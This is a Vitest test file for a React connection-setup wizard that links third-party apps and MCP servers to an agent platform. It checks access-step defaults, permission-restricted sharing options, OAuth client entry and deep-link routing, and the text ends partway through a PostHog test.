// @vitest-environment jsdom

import { act, type ReactNode } from "react";
import { createRoot, type Root } from "react-dom/client";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { CONNECTABLE_APP_DEFINITIONS } from "@paperclipai/shared";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { ApiError } from "@/api/client";
import { queryKeys } from "@/lib/queryKeys";
import { ConnectionSetupFlow } from "@/features/connections/ConnectionSetupFlow";
import { AppsConnect } from "./AppsConnect";

const listGalleryMock = vi.hoisted(() => vi.fn());
const listApplicationsMock = vi.hoisted(() => vi.fn());
const listConnectionsMock = vi.hoisted(() => vi.fn());
const connectAppMock = vi.hoisted(() => vi.fn());
const startOAuthMock = vi.hoisted(() => vi.fn());
const finishAppMock = vi.hoisted(() => vi.fn());
const putConnectionInstallsMock = vi.hoisted(() => vi.fn());
const getCloudConnectorEnrollmentMock = vi.hoisted(() => vi.fn());
const startCloudConnectorEnrollmentMock = vi.hoisted(() => vi.fn());
const listAgentsMock = vi.hoisted(() => vi.fn());
const mockNavigate = vi.hoisted(() => vi.fn());
const navigateTopLevelMock = vi.hoisted(() => vi.fn());
const mockSearch = vi.hoisted(() => ({ value: "" }));
const mockParams = vi.hoisted(() => ({ appKey: undefined as string | undefined }));

const ZAPIER = CONNECTABLE_APP_DEFINITIONS.find((app) => app.slug === "zapier")!;
const GITHUB = CONNECTABLE_APP_DEFINITIONS.find((app) => app.slug === "github")!;
const GITHUB_MANAGED = {
  ...GITHUB,
  ownershipAvailability: {
    ...GITHUB.ownershipAvailability,
    platform_shared: true,
  },
};
const NOTION = CONNECTABLE_APP_DEFINITIONS.find((app) => app.slug === "notion")!;
const ASANA = CONNECTABLE_APP_DEFINITIONS.find((app) => app.slug === "asana")!;
const POSTHOG = CONNECTABLE_APP_DEFINITIONS.find((app) => app.slug === "posthog")!;
const POSTMAN = CONNECTABLE_APP_DEFINITIONS.find((app) => app.slug === "postman")!;
const SHOPIFY = CONNECTABLE_APP_DEFINITIONS.find((app) => app.slug === "shopify")!;
const GOOGLE_SHEETS = CONNECTABLE_APP_DEFINITIONS.find((app) => app.slug === "google-sheets")!;
const GOOGLE_CALENDAR = CONNECTABLE_APP_DEFINITIONS.find((app) => app.slug === "google-calendar")!;
const GOOGLE_DRIVE = CONNECTABLE_APP_DEFINITIONS.find((app) => app.slug === "google-drive")!;
const GMAIL = CONNECTABLE_APP_DEFINITIONS.find((app) => app.slug === "gmail")!;
const PAGERDUTY = CONNECTABLE_APP_DEFINITIONS.find((app) => app.slug === "pagerduty")!;
const COMPOSIO = CONNECTABLE_APP_DEFINITIONS.find((app) => app.slug === "composio")!;

vi.mock("@/api/tools", () => ({
  toolsApi: {
    listGallery: (companyId: string) => listGalleryMock(companyId),
    listApplications: (companyId: string) => listApplicationsMock(companyId),
    listConnections: (companyId: string) => listConnectionsMock(companyId),
    connectApp: (companyId: string, input: unknown) => connectAppMock(companyId, input),
    startOAuth: (connectionId: string, input?: unknown) => startOAuthMock(connectionId, input),
    finishApp: (companyId: string, connectionId: string, input: unknown) =>
      finishAppMock(companyId, connectionId, input),
    putConnectionInstalls: (connectionId: string, installs: unknown) =>
      putConnectionInstallsMock(connectionId, installs),
    getCloudConnectorEnrollment: () => getCloudConnectorEnrollmentMock(),
    startCloudConnectorEnrollment: (companyId: string, label?: string, returnTo?: string) =>
      startCloudConnectorEnrollmentMock(companyId, label, returnTo),
  },
}));

vi.mock("@/api/agents", () => ({
  agentsApi: { list: (companyId: string) => listAgentsMock(companyId) },
}));

vi.mock("@/lib/browserNavigation", () => ({
  navigateTopLevel: (target: string) => navigateTopLevelMock(target),
}));

vi.mock("@/lib/router", () => ({
  useNavigate: () => mockNavigate,
  useParams: () => mockParams,
  useSearchParams: () => [new URLSearchParams(mockSearch.value), vi.fn()],
}));

vi.mock("@/context/CompanyContext", () => ({
  useCompany: () => ({
    selectedCompanyId: "company-1",
    selectedCompany: { id: "company-1", name: "Paperclip" },
  }),
}));

vi.mock("@/context/BreadcrumbContext", () => ({
  useBreadcrumbs: () => ({ setBreadcrumbs: vi.fn() }),
}));

vi.mock("@/context/ToastContext", () => ({
  useToast: () => ({ pushToast: vi.fn() }),
}));

// eslint-disable-next-line @typescript-eslint/no-explicit-any
(globalThis as any).IS_REACT_ACT_ENVIRONMENT = true;

async function flushReact() {
  await act(async () => {
    await Promise.resolve();
    await new Promise((resolve) => window.setTimeout(resolve, 0));
  });
}

function setInputValue(input: HTMLInputElement, value: string) {
  const setter = Object.getOwnPropertyDescriptor(
    window.HTMLInputElement.prototype,
    "value",
  )?.set;
  setter?.call(input, value);
  input.dispatchEvent(new Event("input", { bubbles: true }));
}

function setTextareaValue(textarea: HTMLTextAreaElement, value: string) {
  const setter = Object.getOwnPropertyDescriptor(
    window.HTMLTextAreaElement.prototype,
    "value",
  )?.set;
  setter?.call(textarea, value);
  textarea.dispatchEvent(new Event("input", { bubbles: true }));
}

function buttonByText(text: string): HTMLButtonElement | undefined {
  return Array.from(document.body.querySelectorAll("button")).find(
    (b) => b.textContent?.trim() === text,
  ) as HTMLButtonElement | undefined;
}

function buttonContaining(text: string): HTMLButtonElement | undefined {
  return Array.from(document.body.querySelectorAll("button")).find(
    (b) => b.textContent?.includes(text),
  ) as HTMLButtonElement | undefined;
}

function radioContaining(text: string): HTMLButtonElement | undefined {
  return Array.from(document.body.querySelectorAll<HTMLButtonElement>('[role="radio"]')).find(
    (button) => button.textContent?.includes(text),
  );
}

/**
 * Advance past the Access step (PAP-17835), which now sits between picking a
 * curated app and entering its credential. Picks "Any agent" so Continue is
 * enabled without depending on the agent list.
 */
async function passAccessStep() {
  const anyAgent = Array.from(document.body.querySelectorAll('[role="radio"]'))
    .find((option) => option.textContent?.includes("Any agent"));
  if (anyAgent) {
    await act(async () => {
      anyAgent.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();
  }
  const submit = Array.from(document.body.querySelectorAll("button")).find(
    (b) => b.textContent?.trim() === "Save and continue"
      || b.textContent?.trim().startsWith("Continue to"),
  );
  await act(async () => {
    submit?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
  });
  await flushReact();
}

/** Submit the curated setup screen after Access for OAuth methods that also
 * expose customer-owned client details. Browser sign-in remains the default
 * when the optional client ID is left empty. */
async function submitCuratedOAuthSetup() {
  const submit = buttonByText("Continue to sign in");
  // Automatic OAuth definitions hand off directly from Access. Definitions
  // with required provider configuration still render the setup submit.
  if (!submit) {
    await flushReact();
    return;
  }
  await act(async () => {
    submit.dispatchEvent(new MouseEvent("click", { bubbles: true }));
  });
  await flushReact();
}

async function gotoLinkFrame(container: HTMLDivElement, url: string) {
  const linkInput = Array.from(
    container.querySelectorAll<HTMLInputElement>("input"),
  ).find((i) => i.getAttribute("placeholder")?.startsWith("https://"));
  expect(linkInput).toBeTruthy();
  await act(async () => setInputValue(linkInput!, url));
  await flushReact();
  await act(async () => {
    buttonByText("Continue")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
  });
  await flushReact();
  await passAccessStep();
}

describe("AppsConnect — Connect with a link (M4 frame)", () => {
  let container: HTMLDivElement;
  let mountedRoot: Root | null;

  beforeEach(() => {
    vi.resetAllMocks();
    mockSearch.value = "";
    mockParams.appKey = undefined;
    container = document.createElement("div");
    document.body.appendChild(container);
    mountedRoot = null;
    listGalleryMock.mockResolvedValue({
      apps: [
        ZAPIER,
        GITHUB,
      ],
      capabilities: {
        canCreateOrganizationGrant: true,
        organizationGrantReason: null,
        canSetCompanyInstall: true,
        companyInstallReason: null,
      },
    });
    listApplicationsMock.mockResolvedValue({ applications: [] });
    listConnectionsMock.mockResolvedValue({ connections: [] });
    startOAuthMock.mockResolvedValue({
      connectionId: "conn-notion",
      provider: "notion",
      authorizationUrl: "https://mcp.notion.com/authorize?state=resumed",
      expiresAt: "2099-01-01T00:00:00.000Z",
    });
    finishAppMock.mockResolvedValue({});
    putConnectionInstallsMock.mockResolvedValue({ connectionId: "conn-1", installs: [] });
    getCloudConnectorEnrollmentMock.mockResolvedValue({
      configured: true,
      status: "active",
      brokerBaseUrl: "https://my-staging.paperclip.app",
      instanceId: "inst-test",
      environment: "staging",
      origins: ["https://paperclip.example.test"],
    });
    startCloudConnectorEnrollmentMock.mockResolvedValue({
      configured: false,
      status: "pending",
      brokerBaseUrl: "https://my-staging.paperclip.app",
      instanceId: "inst-test",
      environment: "staging",
      origins: [],
      verificationUrl: "https://my-staging.paperclip.app/connections/enroll?id=enroll-test",
    });
    connectAppMock.mockResolvedValue({
      connectionId: "conn-1",
      application: { id: "app-1", name: "example.com" },
      actions: { readOnly: [], canMakeChanges: [] },
      catalog: [],
      suggestedDefaults: {},
    });
    listAgentsMock.mockResolvedValue([
      { id: "agent-1", name: "Ada", title: "CTO", status: "active", icon: "Bot" },
      { id: "agent-2", name: "Grace", title: "Engineer", status: "active", icon: "Code" },
    ]);
  });

  afterEach(async () => {
    if (mountedRoot) {
      await act(async () => mountedRoot?.unmount());
    }
    document.body.removeChild(container);
    document.body.innerHTML = "";
    vi.restoreAllMocks();
    vi.clearAllMocks();
  });

  async function render(queryClient?: QueryClient, byoOnly = false, content?: ReactNode) {
    const root = createRoot(container);
    mountedRoot = root;
    const client = queryClient ?? new QueryClient({ defaultOptions: { queries: { retry: false } } });
    await act(async () => {
      root.render(
        <QueryClientProvider client={client}>
          {content ?? <AppsConnect byoOnly={byoOnly} />}
        </QueryClientProvider>,
      );
    });
    await flushReact();
    await flushReact();
    return root;
  }

  it("shows only MCP URL setup on the BYO page", async () => {
    await render(undefined, true);

    const text = container.textContent ?? "";
    expect(text).toContain("Connect your own MCP server");
    expect(text).not.toContain("More ways to connect");
    expect(text).not.toContain("Run your own");
    expect(text).not.toContain("Paste a config");
    expect(text).not.toContain("Search apps…");
    expect(text).not.toContain("Pick the app you want your agents to use.");
    expect(text).not.toContain("Zapier");

    const urlInput = container.querySelector<HTMLInputElement>('input[aria-label="MCP server URL"]');
    expect(urlInput).toBeTruthy();
    expect(document.activeElement).toBe(urlInput);
  });

  it("an unrecognized URL routes to a minimal frame with the URL and key choice", async () => {
    await render();
    await gotoLinkFrame(container, "https://www.example.com/actions");

    expect(container.textContent).toContain("Connect your own MCP server");
    expect(container.textContent).toContain("https://www.example.com/actions");
    expect(container.textContent).toContain("Does it need a key?");
    expect(Array.from(container.querySelectorAll("label")).find(
      (label) => label.textContent === "Does it need a key?",
    )?.classList.contains("mr-2")).toBe(true);
    expect(buttonByText("No")).toBeTruthy();
    expect(buttonByText("Yes")).toBeTruthy();

    expect(container.querySelector('input[placeholder="My app"]')).toBeNull();
  });

  it("opens the shared Access step before configuring a pasted MCP server", async () => {
    await render();

    const linkInput = Array.from(
      container.querySelectorAll<HTMLInputElement>("input"),
    ).find((input) => input.getAttribute("placeholder")?.startsWith("https://"));
    await act(async () => setInputValue(linkInput!, "https://mcp.example.com/actions"));
    await flushReact();
    await act(async () => {
      buttonByText("Continue")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(container.textContent).toContain("Which humans can use this credential?");
    expect(container.textContent).toContain("Which agents can use this connection?");
    expect(radioContaining("Just me")).toBeTruthy();
    expect(radioContaining("Any human in the company")?.getAttribute("aria-checked")).toBe("true");
    expect(radioContaining("Just agents I pick")).toBeTruthy();
    expect(radioContaining("Any agent")?.getAttribute("aria-checked")).toBe("true");
    expect(container.textContent).not.toContain("Does it need a key?");
  });

  // -------------------------------------------------------------------------
  // Access step (PAP-17835). Identity and agent reach are chosen before any
  // credential is entered.
  // -------------------------------------------------------------------------

  it("asks for a GitHub identity and defaults to the current user and every agent", async () => {
    mockParams.appKey = "github";
    listGalleryMock.mockResolvedValue({ apps: [GITHUB_MANAGED] });
    await render();

    expect(container.textContent).toContain("Access");
    expect(container.textContent).toContain("Which GitHub identity should this use?");
    expect(container.textContent).toContain("Which agents can use this connection?");
    expect(container.textContent).not.toContain("Choose access before adding credentials");
    expect(container.textContent).not.toContain("Set the identity and agent reach first");
    expect(container.textContent).not.toContain("Which humans can use this credential?");
    expect(container.textContent).not.toContain("Choose where this connection will be available.");
    // Nothing about the credential itself is on screen yet.
    expect(container.querySelector('input[type="password"]')).toBeNull();

    const radios = Array.from(document.body.querySelectorAll('[role="radio"]'));
    const myAccount = radios.find((r) => r.textContent?.includes("My GitHub account"));
    const dedicated = radios.find((r) => r.textContent?.includes("A dedicated account for an agent"));
    const agentsIPick = radios.find((r) => r.textContent?.includes("Just agents I pick"));
    const anyAgent = radios.find((r) => r.textContent?.includes("Any agent"));
    expect(myAccount).toBeTruthy();
    expect(dedicated).toBeTruthy();
    expect(myAccount?.textContent).toBe("My GitHub account");
    expect(dedicated?.textContent).toBe("A dedicated account for an agent");
    expect(agentsIPick?.textContent).toBe("Just agents I pick");
    expect(anyAgent?.textContent).toBe("Any agent");
    expect(myAccount?.querySelectorAll('[data-slot="radio-card-icon"] svg')).toHaveLength(1);
    expect(dedicated?.querySelectorAll('[data-slot="radio-card-icon"] svg')).toHaveLength(1);
    expect(agentsIPick?.querySelectorAll('[data-slot="radio-card-icon"] svg')).toHaveLength(1);
    expect(anyAgent?.querySelectorAll('[data-slot="radio-card-icon"] svg')).toHaveLength(2);
    expect(myAccount?.getAttribute("aria-checked")).toBe("true");
    expect(dedicated?.getAttribute("aria-checked")).toBe("false");
    // Every agent is the default reach for the responsible person's identity.
    expect(agentsIPick?.getAttribute("aria-checked")).toBe("false");
    expect(anyAgent?.getAttribute("aria-checked")).toBe("true");
  });

  it("keeps provider guidance and card styling out of the shared access step", async () => {
    mockParams.appKey = "pagerduty";
    listGalleryMock.mockResolvedValue({ apps: [PAGERDUTY] });

    await render();

    expect(container.textContent).toContain("Which humans can use this credential?");
    expect(container.textContent).toContain("Which agents can use this connection?");
    expect(container.textContent).not.toContain("A PagerDuty API token");
    expect(container.textContent).not.toContain("Use a customer-created PagerDuty key");
    expect(container.textContent).not.toContain("Review PagerDuty setup requirements");

    const accessHeading = Array.from(container.querySelectorAll("h2")).find(
      (heading) => heading.textContent === "Which humans can use this credential?",
    );
    const accessCard = accessHeading?.closest(".overflow-hidden");
    expect(accessCard).toBeTruthy();
    expect(accessCard?.classList.contains("bg-card")).toBe(false);
    expect(accessCard?.classList.contains("shadow-sm")).toBe(false);
  });

  it("defaults to every agent and only blocks an empty explicit selection", async () => {
    mockParams.appKey = "github";
    await render();

    expect(buttonByText("Save and continue")?.disabled).toBe(false);

    await act(async () => {
      Array.from(document.body.querySelectorAll('[role="radio"]'))
        .find((r) => r.textContent?.includes("Just agents I pick"))
        ?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(buttonByText("Save and continue")?.disabled).toBe(true);
  });

  it("keeps the access selections when the wizard moves backward", async () => {
    mockParams.appKey = "github";
    await render();

    await act(async () => {
      Array.from(document.body.querySelectorAll('[role="radio"]'))
        .find((r) => r.textContent?.includes("My GitHub account"))
        ?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();
    await act(async () => {
      Array.from(document.body.querySelectorAll('[role="radio"]'))
        .find((r) => r.textContent?.includes("Any agent"))
        ?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    await act(async () => {
      buttonByText("Save and continue")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();
    expect(container.textContent).toContain("Connect GitHub");

    await act(async () => {
      buttonByText("Back")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    // Moving backward must not silently reset the identity the operator chose.
    const radios = Array.from(document.body.querySelectorAll('[role="radio"]'));
    expect(radios.find((r) => r.textContent?.includes("My GitHub account"))?.getAttribute("aria-checked"))
      .toBe("true");
    expect(radios.find((r) => r.textContent?.includes("Any agent"))?.getAttribute("aria-checked"))
      .toBe("true");
  });

  it("uses Cancel to exit while the bottom Back button stays in the wizard", async () => {
    mockParams.appKey = "github";
    await render();

    await act(async () => {
      buttonByText("Cancel")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });

    expect(mockNavigate).toHaveBeenCalledWith("/apps");
  });

  /**
   * Company-wide is a default, not a restriction. Flexible API-key and OAuth
   * methods must still let the operator deliberately choose a personal identity.
   */
  it("defaults flexible methods to company identity and keeps personal credentials submittable", async () => {
    listGalleryMock.mockResolvedValue({ apps: [COMPOSIO, POSTHOG] });

    const identityChoices = () => {
      const radios = Array.from(
        document.body.querySelectorAll<HTMLButtonElement>('[role="radio"]'),
      );
      return {
        justMe: radios.find((r) => r.textContent?.includes("Just me")),
        wholeOrg: radios.find((r) => r.textContent?.includes("Any human in the company")),
      };
    };

    // --- API-key-only method: shared by default, personal still offered ------
    let root = await render();
    await act(async () => {
      buttonContaining("Composio")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    const github = identityChoices();
    expect(github.wholeOrg?.getAttribute("aria-checked")).toBe("true");
    expect(github.justMe?.getAttribute("aria-checked")).toBe("false");
    // Present, and genuinely selectable — not the disabled-with-reason state.
    expect(github.justMe).toBeTruthy();
    expect(github.justMe?.disabled).toBe(false);
    expect(document.body.textContent).not.toContain(
      "This connection method supports a shared organization credential only.",
    );

    await act(async () => {
      github.justMe?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();
    await act(async () => {
      Array.from(document.body.querySelectorAll('[role="radio"]'))
        .find((r) => r.textContent?.includes("Any agent"))
        ?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();
    await act(async () => {
      buttonByText("Save and continue")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    const keyField = container.querySelector<HTMLInputElement>("input[type=password]");
    await act(async () => setInputValue(keyField!, "composio-personal-token"));
    await flushReact();
    await act(async () => {
      buttonByText("Connect")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    // The load-bearing assertion: an API-key-only method reaches the server as
    // a personal grant. A disabled "Just me" would make this unreachable.
    expect(connectAppMock).toHaveBeenCalledTimes(1);
    expect(connectAppMock.mock.calls[0]?.[1]).toMatchObject({
      galleryKey: "composio",
      grantKind: "user",
    });

    // --- Same gallery, identity-bearing method: company by default -----------
    await act(async () => root.unmount());
    document.body.innerHTML = "";
    container = document.createElement("div");
    document.body.appendChild(container);
    mockParams.appKey = "posthog";
    root = await render();

    const posthog = identityChoices();
    expect(posthog.justMe?.getAttribute("aria-checked")).toBe("false");
    expect(posthog.wholeOrg?.getAttribute("aria-checked")).toBe("true");
    expect(posthog.justMe?.disabled).toBe(false);
    expect(posthog.wholeOrg?.disabled).toBe(false);
  });

  it("shows Gmail's instance configuration notice instead of a dead connect path", async () => {
    const reason = "Configure Paperclip ID before connecting Gmail.";
    listGalleryMock.mockResolvedValue({
      apps: [{ ...GMAIL, availability: { available: false, reason } }],
    });
    await render();

    const gmail = buttonContaining("Gmail");
    expect(gmail?.disabled).toBe(true);
    expect(gmail?.textContent).toContain(reason);
    expect(gmail?.textContent).not.toContain("Coming soon");
  });

  it("collects customer-owned OAuth client details for a curated manual OAuth app", async () => {
    listGalleryMock.mockResolvedValue({ apps: [ASANA] });
    mockParams.appKey = "asana";
    await render();
    await passAccessStep();

    expect(container.textContent).toContain("Your OAuth app");
    expect(container.textContent).toContain("Open Asana app settings");
    expect(container.textContent).not.toContain("Create an Asana MCP OAuth app");
    expect(container.textContent).toContain("Paperclip callback URL");
    expect(container.textContent).toContain(
      "http://localhost:3000/api/tools/oauth/callback",
    );
    expect(buttonByText("Continue to sign in")?.disabled).toBe(true);

    const clientId = container.querySelector<HTMLInputElement>("#curated-oauth-client-id")!;
    const clientSecret = container.querySelector<HTMLInputElement>("#curated-oauth-client-secret")!;
    await act(async () => {
      setInputValue(clientId, "asana-client-id");
      setInputValue(clientSecret, "asana-client-secret");
    });
    await flushReact();
    expect(buttonByText("Continue to sign in")?.disabled).toBe(false);

    await act(async () => {
      buttonByText("Continue to sign in")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(connectAppMock).toHaveBeenCalledWith("company-1", expect.objectContaining({
      galleryKey: "asana",
      connectionMethodKey: "mcp-own-oauth",
      oauthClient: {
        clientId: "asana-client-id",
        clientSecret: "asana-client-secret",
      },
    }));
  });

  it("submits the Postman access mode selected on the setup screen", async () => {
    listGalleryMock.mockResolvedValue({ apps: [POSTMAN] });
    mockParams.appKey = "postman";
    connectAppMock.mockResolvedValueOnce({
      connectionId: "conn-postman",
      application: { id: "app-postman", name: "Postman" },
      connection: { id: "conn-postman" },
      actions: { readOnly: [], canMakeChanges: [] },
      catalog: [],
      suggestedDefaults: {},
      auth: { kind: "oauth", startUrl: "https://oauth.pstmn.io/authorize?state=opaque" },
    });

    await render();
    await passAccessStep();

    const full = radioContaining("Full");
    const code = radioContaining("Code");
    expect(full).toBeTruthy();
    expect(code).toBeTruthy();
    expect(full?.getAttribute("aria-checked")).toBe("true");
    await act(async () => {
      code?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();
    expect(code?.getAttribute("aria-checked")).toBe("true");
    await act(async () => {
      full?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();
    expect(full?.getAttribute("aria-checked")).toBe("true");
    expect(radioContaining("US · Browser sign-in")?.getAttribute("aria-checked")).toBe("true");

    await act(async () => {
      buttonByText("Continue to sign in")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(connectAppMock).toHaveBeenCalledWith("company-1", expect.objectContaining({
      galleryKey: "postman",
      connectionMethodKey: "mcp-oauth-full",
    }));
    expect(navigateTopLevelMock).toHaveBeenCalledWith(
      "https://oauth.pstmn.io/authorize?state=opaque",
    );
  });

  it("opens a manual OAuth app from the same source deep link Browse uses", async () => {
    listGalleryMock.mockResolvedValue({ apps: [ASANA] });
    mockParams.appKey = undefined;
    mockSearch.value = "source=asana";

    await render();

    expect(document.body.textContent).toContain("Which humans can use this credential?");
    expect(document.body.textContent).toContain("Which agents can use this connection?");
    expect(document.body.textContent).not.toContain("Pick the app you want your agents to use.");
    expect(mockNavigate).not.toHaveBeenCalledWith("/apps/connect", { replace: true });
  });

  it("starts a selected app deep link at step one of its two-step setup", async () => {
    mockSearch.value = "source=gmail";
    listGalleryMock.mockResolvedValue({ apps: [GMAIL] });

    await render();

    expect(document.body.textContent).toContain("Step 1 of 2");
    expect(document.body.textContent).toContain("Access   ·   Choose connection");
    expect(document.body.textContent).not.toContain("Pick app   ·");
  });

  it("opens a brokered Gmail deep link at the access step", async () => {
    mockParams.appKey = "gmail";
    mockSearch.value = "byo=1&appKey=gmail&stage=access";
    listGalleryMock.mockResolvedValue({ apps: [GMAIL] });

    await render();

    expect(document.body.textContent).toContain("Step 1 of 2");
    expect(document.body.textContent).toContain("Access   ·   Choose connection");
    expect(document.body.textContent).not.toContain("Pick app   ·");
    expect(document.body.textContent).toContain("Which humans can use this credential?");
    expect(document.body.textContent).toContain("Just me");
    expect(mockNavigate).not.toHaveBeenCalledWith("/apps/connect", { replace: true });
  });

  it("prompts for one-time Cloud registration inside Gmail when managed methods are not yet advertised", async () => {
    mockParams.appKey = "gmail";
    listGalleryMock.mockResolvedValue({
      apps: [{
        ...GMAIL,
        methods: GMAIL.methods.filter((method) => !method.oauthStrategy),
        ownershipAvailability: { platform_shared: false, customer: true, dcr: true },
      }],
    });
    getCloudConnectorEnrollmentMock.mockResolvedValueOnce({
      configured: false,
      status: "not_configured",
      brokerBaseUrl: "https://my-staging.paperclip.app",
      instanceId: null,
      environment: "staging",
      origins: [],
    });

    await render();
    await passAccessStep();

    expect(container.textContent).toContain("Connect with Paperclip");
    expect(container.textContent).not.toContain("Required once for managed Google sign-in.");
    expect(container.textContent).not.toContain("Your OAuth app");

    await act(async () => {
      buttonByText("Connect with Paperclip")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(startCloudConnectorEnrollmentMock).toHaveBeenCalledWith(
      "company-1",
      "Paperclip",
      "/apps/connect?source=gmail&stage=setup",
    );
    expect(navigateTopLevelMock).toHaveBeenCalledWith(
      "https://my-staging.paperclip.app/connections/enroll?id=enroll-test",
    );
  });

  it("keeps Google Drive prerequisites off access and defaults to its write-capable method", async () => {
    mockParams.appKey = "google-drive";
    listGalleryMock.mockResolvedValue({ apps: [GOOGLE_DRIVE] });

    await render();

    expect(container.textContent).not.toContain("Google Developer Preview access required");
    expect(container.textContent).not.toContain("does not enable unrelated Paperclip customers");
    expect(container.textContent).not.toContain("final project-registration email");
    expect(container.textContent).not.toContain("Apply or verify Developer Preview enrollment");
    expect(radioContaining("Just me")).toBeTruthy();
    expect(radioContaining("Any human in the company")?.getAttribute("aria-checked")).toBe("true");
    await passAccessStep();

    expect(radioContaining("Read & create")?.getAttribute("aria-checked")).toBe("true");
    expect(radioContaining("Read only")?.getAttribute("aria-checked")).toBe("false");
    expect(container.textContent).not.toContain("Before connecting, enroll the signed-in Workspace account");
    expect(container.textContent).toContain("Review requirements");
    expect(container.textContent).toContain("Your OAuth app");
  });

  it("renders Google Calendar as one minimal, unboxed setup screen", async () => {
    mockParams.appKey = "google-calendar";
    listGalleryMock.mockResolvedValue({ apps: [GOOGLE_CALENDAR] });

    await render();
    await passAccessStep();

    const duplicateHeadings = Array.from(container.querySelectorAll("h1, h2")).filter(
      (heading) => heading.textContent?.trim() === "Connect Google Calendar",
    );
    expect(duplicateHeadings).toHaveLength(1);
    expect(container.textContent).toContain("What should Paperclip be able to do?");
    expect(container.textContent).toContain("Review requirements");
    expect(container.textContent).not.toContain("Connect Google Calendar to read and manage events.");
    expect(container.textContent).not.toContain("All event mutations require approval.");
    expect(container.textContent).not.toContain("Google Workspace MCP servers are in Developer Preview.");
    expect(container.textContent).not.toContain("We filled this in from the app.");
    expect(container.textContent).not.toContain("You’ll continue to Google Calendar");
    expect(container.textContent).not.toContain("You’ll sign in before anything turns on.");
    expect(container.querySelector('input[placeholder="My app"]')).toBeNull();

    const capabilityQuestion = Array.from(container.querySelectorAll("label")).find(
      (label) => label.textContent === "What should Paperclip be able to do?",
    );
    expect(capabilityQuestion?.closest(".max-w-xl")?.classList.contains("bg-card")).toBe(false);
  });

  it("keeps Shopify prerequisite copy off access before collecting the store domain", async () => {
    mockParams.appKey = "shopify";
    listGalleryMock.mockResolvedValue({ apps: [SHOPIFY] });

    await render();

    expect(container.textContent).not.toContain("Launch the storefront before connecting");
    expect(container.textContent).not.toContain("Storefront visibility to Public");
    expect(container.textContent).not.toContain("Open Shopify Admin");
    await passAccessStep();

    expect(container.textContent).not.toContain("Launch the storefront before connecting");
    expect(container.textContent).not.toContain("Open Shopify Admin");
  });

  /**
   * Design §"Question 2": a member who may create a personal grant but cannot
   * configure a company-wide install sees **Any agent** disabled with the
   * reason — not hidden. Disabling it is only half the job; Continue has to
   * refuse it too, or the forbidden choice is still submittable by keyboard.
   *
   * Driven through AppsConnect so this proves the pre-connection capability
   * returned with the gallery reaches the real create flow.
   */
  it("disables Any agent and blocks Continue when the member cannot install company-wide", async () => {
    mockParams.appKey = "posthog";
    listGalleryMock.mockResolvedValueOnce({
      apps: [POSTHOG],
      capabilities: {
        canCreateOrganizationGrant: false,
        organizationGrantReason: "Only connection managers can share this credential.",
        canSetCompanyInstall: false,
        companyInstallReason: "Your company policy limits this choice to connection managers.",
      },
    });
    await render();

    const anyAgent = Array.from(
      document.body.querySelectorAll<HTMLButtonElement>('[role="radio"]'),
    ).find((r) => r.textContent?.includes("Any agent"));

    // Visible and not selectable; the reason stays available without adding
    // visual subtext to the compact option.
    expect(anyAgent).toBeTruthy();
    expect(anyAgent?.disabled).toBe(true);
    expect(anyAgent?.textContent).not.toContain(
      "Your company policy limits this choice to connection managers.",
    );
    expect(anyAgent?.getAttribute("title")).toBe(
      "Your company policy limits this choice to connection managers.",
    );
    expect(anyAgent?.getAttribute("aria-label")).toContain(
      "Your company policy limits this choice to connection managers.",
    );
    const organization = radioContaining("Any human in the company");
    expect(organization?.disabled).toBe(true);
    expect(organization?.getAttribute("title")).toBe(
      "Only connection managers can share this credential.",
    );
    expect(radioContaining("Just me")?.disabled).toBe(false);
    // "Just agents I pick" is the live alternative, so the step is not a dead end.
    const pick = Array.from(
      document.body.querySelectorAll<HTMLButtonElement>('[role="radio"]'),
    ).find((r) => r.textContent?.includes("Just agents I pick"));
    expect(pick?.disabled).toBe(false);
    // Continue refuses the forbidden choice even though it is the current one.
    expect(buttonByText("Save and continue")?.disabled).toBe(true);
  });

  it("opens the selected app directly on its setup route", async () => {
    mockParams.appKey = "github";
    await render();

    // A deep-linked app lands on Access first: identity and reach are chosen
    // before the credential (PAP-17835).
    expect(container.textContent).toContain("Which GitHub identity should this use?");
    await passAccessStep();

    expect(container.textContent).toContain("Connect GitHub");
    expect(container.textContent).not.toContain("Pick the app you want your agents to use.");
  });

  it("connects PostHog without a project ID and keeps optional controls advanced", async () => {
    mockParams.appKey = "posthog";
    listGalleryMock.mockResolvedValueOnce({ apps: [POSTHOG] });
    await render();
    // Access comes first for a curated app; the method chooser shares a screen
    // with the credential fields, so it sits behind it (PAP-17835).
    expect(container.textContent).toContain("Which humans can use this credential?");
    await passAccessStep();

    expect(container.textContent).toContain("How do you want to connect?");
    expect(radioContaining("Sign in with PostHog")?.getAttribute("aria-checked")).toBe("false");
    expect(radioContaining("Use a personal API key")?.getAttribute("aria-checked")).toBe("false");
    expect(buttonByText("Connect")?.disabled).toBe(true);

    await act(async () => {
      radioContaining("Use a personal API key")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(container.textContent).not.toContain("Where are credentials managed?");
